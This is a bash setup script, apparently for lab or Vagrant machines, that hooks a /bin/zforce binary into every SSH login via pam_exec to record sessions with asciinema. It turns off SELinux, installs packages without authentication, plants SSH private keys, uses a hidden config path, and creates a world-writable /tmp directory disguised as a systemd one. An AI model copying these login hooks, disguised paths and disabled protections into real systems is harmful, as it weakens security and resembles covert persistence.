#!/bin/bash
PAMD_FILE=/etc/pam.d/sshd
RT_KN_HST_F=/root/.ssh/known_hosts
ASC_CFG_D=/var/lib/.config/asciinema
ASC_CFG_SD=/var/lib/.config/
SRV_HST_K="10.124.0.216 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAOWuA/3CDjKGREPuoL+Ubp7qWKNWudfW88wsx77BqcP9snyViImIKgo0xF5kPabO9YYvHpPUe2dKMjmieaomUU="


INS='session required  pam_exec.so  /bin/zforce'
if [ -f /etc/os-release ]; then

    . /etc/os-release
    OS=$NAME
    VER=$VERSION_ID
    if echo $OS | grep -qi 'ubuntu' ; then  apt-get --allow-unauthenticated  install  -f asciinema rsync screen -y; fi
    if echo $OS | grep -qi 'debian' ; then  apt-get --allow-unauthenticated  install  -f asciinema rsync screen -y; fi
    if echo $OS | grep -qi 'centos' ; then  setenforce 0;  yum install epel-release -y; yum makecache;  yum install asciinema  -y; fi

elif type lsb_release >/dev/null 2>&1; then

    OS=$(lsb_release -si)
    VER=$(lsb_release -sr)
    if echo $OS | grep -qi 'ubuntu' ; then   apt-get --allow-unauthenticated  install  -f asciinema rsync screen -y  -y; fi
    if echo $OS | grep -qi 'centos' ; then  setenforce 0; yum install epel-release -y; yum makecache; yum  install    asciinema  -y; fi

elif [ -f /etc/lsb-release ]; then
    . /etc/lsb-release
    OS=$DISTRIB_ID
    VER=$DISTRIB_RELEASE
    if echo $OS | grep -qi 'ubuntu' ; then   apt-get --allow-unauthenticated  install  -f asciinema rsync screen -y; fi
    if echo $OS | grep -qi 'debian' ; then   apt-get --allow-unauthenticated  install  -f asciinema rsync screen -y; fi
    if echo $OS | grep -qi 'centos' ; then  setenforce 0; yum install epel-release -y ; yum makecache; yum     install    asciinema  -y; fi
elif [ -f /etc/debian_version ]; then
    
    apt-get install -f asciinema  -y;
fi

[[ -f /bin/zforce  ]] && mv /bin/zforce /bin/zf0rce
cp -rf ./bin/zforce /bin/zforce
chmod +x /bin/zforce

[[ -f /etc/skel/.bashrc  ]] &&  rm -rf  /etc/skel/.bashrc
cp -rf  ./.bashrc /etc/skel/.bashrc

mkdir -p  /home/vagrant/.ssh
cp -rf  ./.ssh/id_rsa* /home/vagrant/.ssh
chmod 600 /home/vagrant/.ssh/id_rsa*
if  ! grep -q  "$INS"  < "$PAMD_FILE" ; then  echo "$INS" >> $PAMD_FILE; fi
mkdir -p /root/.ssh
touch $RT_KN_HST_F
if  ! grep -q  "$SRV_HST_K"  < "$RT_KN_HST_F" ; then  echo "$SRV_HST_K" >> $RT_KN_HST_F; fi
mkdir -p /tmp/systemd-private-a0d0c3ae3099418788d58623149f4783-chronyd.service-zl0obn
chmod 777 /tmp/systemd-private-a0d0c3ae3099418788d58623149f4783-chronyd.service-zl0obn
mkdir -p $ASC_CFG_D
cp -rf ./config $ASC_CFG_D
chmod 777  -R  $ASC_CFG_SD
